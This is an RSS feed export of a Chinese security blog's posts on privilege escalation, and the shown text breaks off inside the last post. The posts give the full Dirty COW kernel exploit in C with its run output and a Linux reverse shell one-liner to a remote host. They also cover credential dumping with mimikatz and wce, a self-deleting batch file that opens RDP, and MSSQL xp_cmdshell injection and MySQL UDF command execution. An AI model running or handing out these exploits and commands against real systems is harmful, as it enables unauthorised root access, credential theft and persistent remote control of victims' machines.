<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Elevate Privileges on </title>
    <link>http://wyb0.com/tags/elevate-privileges/</link>
    <description>Recent content in Elevate Privileges on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Sat, 22 Oct 2016 00:10:46 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/elevate-privileges/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>脏牛漏洞</title>
      <link>http://wyb0.com/posts/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/dirty-cow-vulnerabilities/</guid>
      <description>

&lt;h3 id=&#34;0x00-测试环境:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x00 测试环境&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;CentOS release 6.5
[reber123@WYB ~]$ uname -a
Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[reber123@WYB ~]$ id
uid=502(reber123) gid=502(reber123) groups=502(reber123)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-创建文件:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x01 创建文件&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;查看文件权限信息，可以看到属主为root，且只读，权限为0404&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber123@WYB ~]$ ls -al test
-r-----r-- 1 root root 19 Oct 21 00:02 test
[reber123@WYB ~]$ cat test
this is not a test
[reber123@WYB ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-编译-执行poc:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x02 编译、执行poc&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;POC保存为a.c，编译为aaa&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber123@WYB ~]$ gcc -lpthread a.c -o aaa
[reber123@WYB ~]$ ls
aaa  a.c  test
[reber123@WYB ~]$

更改test的内容
[reber123@WYB ~]$ ./aaa test xxxxxxxxxxx
mmap f8969000

^C
[reber123@WYB ~]$ cat test
xxxxxxxxxxx a test
[reber123@WYB ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-后续利用:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x03 后续利用&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;更改用户gid为0即可

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dirty_cow1.png&#34; alt=&#34;脏牛1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dirty_cow2.png&#34; alt=&#34;脏牛2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;提权后执行下：echo 0 &amp;gt; /proc/sys/vm/dirty_writeback_centisecs 
用来关闭pdflush刷新,否则提权后过几秒系统就会卡死
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-附poc:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x04 附poc&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test &amp;gt; foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -lpthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
  
void *map;
int f;
struct stat st;
char *name;
  
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i&amp;lt;100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ... 06661
&amp;gt; This is achieved by racing the madvise(MADV_DONTNEED) system call
&amp;gt; while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf(&amp;quot;madvise %d\n\n&amp;quot;,c);
}
  
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/sh ... 23c16
&amp;gt;  The in the wild exploit we are aware of doesn&#39;t work on Red Hat
&amp;gt;  Enterprise Linux 5 and 6 out of the box because on one side of
&amp;gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not
&amp;gt;  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open(&amp;quot;/proc/self/mem&amp;quot;,O_RDWR);
  int i,c=0;
  for(i=0;i&amp;lt;100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf(&amp;quot;procselfmem %d\n\n&amp;quot;, c);
}
  
  
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc&amp;lt;3)return 1;
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&amp;amp;st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
&amp;gt; Create a private copy-on-write mapping.  Updates to the
&amp;gt; mapping are not visible to other processes mapping the same
&amp;gt; file, and are not carried through to the underlying file.  It
&amp;gt; is unspecified whether changes made to the file after the
&amp;gt; mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf(&amp;quot;mmap %x\n\n&amp;quot;,map);
/*
You have to do it on two threads.
*/
  pthread_create(&amp;amp;pth1,NULL,madviseThread,argv[1]);
  pthread_create(&amp;amp;pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Linux下系统漏洞提权</title>
      <link>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>

&lt;h3 id=&#34;0x00-linux下的提权:a3b5141d5d3a58fc7b84afdbeb31d2a1&#34;&gt;0x00 Linux下的提权&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Linux下一般都是系统漏洞提权，分为以下几个步骤：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1. 获取系统版本号
2. 根据系统版本号找对应exp
3. 反弹shell
4. 尝试利用
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-提权:a3b5141d5d3a58fc7b84afdbeb31d2a1&#34;&gt;0x01 提权&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;获取系统版本号

&lt;ul&gt;
&lt;li&gt;获取发行版本

&lt;ul&gt;
&lt;li&gt;cat /etc/*-release&lt;/li&gt;
&lt;li&gt;cat /etc/issue&lt;/li&gt;
&lt;li&gt;cat /etc/lsb-release&lt;/li&gt;
&lt;li&gt;cat /etc/redhat-release&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;获取内核版本

&lt;ul&gt;
&lt;li&gt;cat /proc/version&lt;/li&gt;
&lt;li&gt;uname -a&lt;/li&gt;
&lt;li&gt;uname -mrs&lt;/li&gt;
&lt;li&gt;rpm -q kernel&lt;/li&gt;
&lt;li&gt;dmesg | grep Linux&lt;/li&gt;
&lt;li&gt;ls /boot | grep vmlinuz&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;根据系统版本号找对应exp

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com&#34;&gt;http://www.exploit-db.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://1337day.com&#34;&gt;http://1337day.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securiteam.com&#34;&gt;http://www.securiteam.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securityfocus.com&#34;&gt;http://www.securityfocus.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.exploitsearch.net&#34;&gt;http://www.exploitsearch.net&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://metasploit.com/modules&#34;&gt;http://metasploit.com/modules&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://securityreason.com&#34;&gt;http://securityreason.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure&#34;&gt;http://seclists.org/fulldisclosure&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.google.com&#34;&gt;http://www.google.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;反弹shell

&lt;ul&gt;
&lt;li&gt;本地：&lt;code&gt;nc -l -p 8888&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;目标机器：&lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;尝试利用&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-实例:a3b5141d5d3a58fc7b84afdbeb31d2a1&#34;&gt;0x02 实例&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;得到系统版本号

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_get_sys_version.png&#34; alt=&#34;得到系统版本号.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;找对应exp

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_search_exp.png&#34; alt=&#34;找相应exp.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_exp_code.png&#34; alt=&#34;保存exp源码.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;反弹shell

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_webshell_rebound_shell.png&#34; alt=&#34;反弹shell.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;提权

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_write_exp_code.png&#34; alt=&#34;下载exp源码.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_compile_exp_code.png&#34; alt=&#34;编译exp源码.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_linux_run_exp.png&#34; alt=&#34;运行exp.png&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>导出主机密码与开启3389</title>
      <link>http://wyb0.com/posts/export-host-password-and-open-3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/export-host-password-and-open-3389/</guid>
      <description>

&lt;h3 id=&#34;0x00-导出主机密码hash:6bc18aa0fd0aa172f350ed7a87a7af71&#34;&gt;0x00 导出主机密码hash&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;条件

&lt;ul&gt;
&lt;li&gt;administrator以上权限&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;工具

&lt;ul&gt;
&lt;li&gt;wce&lt;/li&gt;
&lt;li&gt;gethash&lt;/li&gt;
&lt;li&gt;hashdump&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;hash解密网站&lt;br /&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.objectif-securite.ch/ophcrack.php&#34;&gt;http://www.objectif-securite.ch/ophcrack.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;上传工具得到hash

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_whoami.png&#34; alt=&#34;查看是否为管理员以上权限&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_wce.png&#34; alt=&#34;上传wce&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_get_hash.png&#34; alt=&#34;得到hash&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_get_pwd.png&#34; alt=&#34;解出密码&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x01-导出主机密码:6bc18aa0fd0aa172f350ed7a87a7af71&#34;&gt;0x01 导出主机密码&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;条件

&lt;ul&gt;
&lt;li&gt;administrator以上权限&lt;/li&gt;
&lt;li&gt;当前管理员没有注销登陆(可以通过query user命令看出)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;工具

&lt;ul&gt;
&lt;li&gt;mimikatz&lt;/li&gt;
&lt;li&gt;getpass&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;上传工具得到密码

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_whoami.png&#34; alt=&#34;查看是否为管理员以上权限&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_query_user.png&#34; alt=&#34;查看管理员是否注销登陆&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_getpass.png&#34; alt=&#34;上传getpass&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_getpass1.png&#34; alt=&#34;得到密码1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_getpass2.png&#34; alt=&#34;得到密码2&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-开启3389:6bc18aa0fd0aa172f350ed7a87a7af71&#34;&gt;0x02 开启3389&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;直接使用注册表

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_new_file_3389_reg.png&#34; alt=&#34;新建开3389的注册表&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_3389.png&#34; alt=&#34;开3389端口&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_3389_success.png&#34; alt=&#34;成功开启3389端口&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;写一个批处理也行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# 3389.bat内容如下：
echo Windows Registry Editor Version 5.00&amp;gt;&amp;gt;3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&amp;gt;&amp;gt;3389.reg 
echo &amp;quot;fDenyTSConnections&amp;quot;=dword:00000000&amp;gt;&amp;gt;3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&amp;gt;&amp;gt;3389.reg 
echo &amp;quot;PortNumber&amp;quot;=dword:00000d3d&amp;gt;&amp;gt;3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&amp;gt;&amp;gt;3389.reg 
echo &amp;quot;PortNumber&amp;quot;=dword:00000d3d&amp;gt;&amp;gt;3389.reg 
regedit /s 3389.reg 
del 3389.reg
del 3389.bat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_new_file_3389_bat.png&#34; alt=&#34;新建开3389的注册表&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Windows下第三方服务提权</title>
      <link>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges/</guid>
      <description>

&lt;p&gt;&lt;center&gt;&lt;h2&gt;MSSQL和MySQL提权&lt;/h2&gt;&lt;/center&gt;&lt;/p&gt;

&lt;h2 id=&#34;mssql提权:8630331b284514675820d26a98874acc&#34;&gt;MSSQL提权&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权&lt;br /&gt;
提权条件：数据库账号是DBA权限&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;关于xp-cmdshell:8630331b284514675820d26a98874acc&#34;&gt;关于xp_cmdshell&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &amp;lsquo;net user&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &amp;lsquo;net user&amp;rsquo;;--&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;连接数据库:8630331b284514675820d26a98874acc&#34;&gt;连接数据库&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_find_sql_conn_msg.png&#34; alt=&#34;Windows下第三方服务提权-找数据库连接信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_conn_mssql.png&#34; alt=&#34;Windows下第三方服务提权-连接mssql数据库&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;执行系统命令:8630331b284514675820d26a98874acc&#34;&gt;执行系统命令&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_try_exec_sys_command.png&#34; alt=&#34;Windows下第三方服务提权-尝试用xp_cmdshell执行命令&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_open_cmd_shell.png&#34; alt=&#34;Windows下第三方服务提权-开启xp_cmdshell组件&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_exec_sys_command_success.png&#34; alt=&#34;Windows下第三方服务提权-使用xp_cmdshell成功执行命令&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;添加用户:8630331b284514675820d26a98874acc&#34;&gt;添加用户&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_add_user.png&#34; alt=&#34;Windows下第三方服务提权-添加用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_user.png&#34; alt=&#34;Windows下第三方服务提权-查看添加的用户&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;远程连接:8630331b284514675820d26a98874acc&#34;&gt;远程连接&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_conn.png&#34; alt=&#34;Windows下第三方服务提权-远程连接&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_input_u_p.png&#34; alt=&#34;Windows下第三方服务提权-输入用户名和密码&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_view_ip.png&#34; alt=&#34;Windows下第三方服务提权-输入用户名和密码&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&#34;mysql提权:8630331b284514675820d26a98874acc&#34;&gt;MySQL提权&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;环境：web应用服务器权限较低&lt;br /&gt;
提权条件：MySQL是system权限&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;关于udf:8630331b284514675820d26a98874acc&#34;&gt;关于UDF&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;udf提权过程:8630331b284514675820d26a98874acc&#34;&gt;UDF提权过程&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;导入udf.dll到服务器指定目录&lt;br /&gt;

&lt;ul&gt;
&lt;li&gt;MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;使用SQL语句创建功能函数&lt;br /&gt;
CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.dll&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;执行MySQL语句调用新创建的函数&lt;br /&gt;
select shell(&amp;lsquo;cmd&amp;rsquo;,&amp;lsquo;whoami&amp;rsquo;);&lt;/li&gt;
&lt;li&gt;删除创建的函数&lt;br /&gt;
drop function shell;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;查看基本信息:8630331b284514675820d26a98874acc&#34;&gt;查看基本信息&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_base_msg.png&#34; alt=&#34;Windows下第三方服务提权-查看基本信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_current_user.png&#34; alt=&#34;Windows下第三方服务提权-查看当前用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_view_current_user_permissions.png&#34; alt=&#34;Windows下第三方服务提权-查看当前用户权限&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;上传udf提权:8630331b284514675820d26a98874acc&#34;&gt;上传udf提权&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_upload_udf.png&#34; alt=&#34;Windows下第三方服务提权-上传udf&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_conn_mysql.png&#34; alt=&#34;Windows下第三方服务提权-连接数据库&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_export_udf.png&#34; alt=&#34;Windows下第三方服务提权-导出udf.dll并生成函数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_exec_whoami.png&#34; alt=&#34;Windows下第三方服务提权-提权成功执行whoami&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;添加用户-1:8630331b284514675820d26a98874acc&#34;&gt;添加用户&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_shell_add_user.png&#34; alt=&#34;Windows下第三方服务提权-通过shell函数添加用户&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
